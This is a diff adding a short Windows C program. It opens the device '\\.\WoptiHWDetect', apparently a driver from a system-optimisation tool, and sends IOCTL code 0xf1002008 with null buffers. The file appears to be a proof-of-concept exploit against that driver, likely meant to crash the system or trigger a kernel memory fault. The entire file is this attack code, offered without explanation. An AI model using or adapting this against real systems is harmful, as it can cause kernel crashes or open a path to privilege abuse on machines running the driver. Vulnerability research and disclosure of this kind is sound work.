@@ -1,0 +1,17 @@
+#include <stdio.h>
+#include <tchar.h>
+#include <windows.h>
+
+int _tmain(int argc, _TCHAR* argv[])
+{
+
+	DWORD nbBytes;
+	HANDLE hDevice;
+
+	hDevice = CreateFile("\\\\.\\WoptiHWDetect", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (hDevice != INVALID_HANDLE_VALUE)
+	{
+		DeviceIoControl(hDevice, 0xf1002008, (LPVOID)0, 0, (LPVOID)0, 0, &nbBytes, NULL);
+	}
+	return 0;
+}
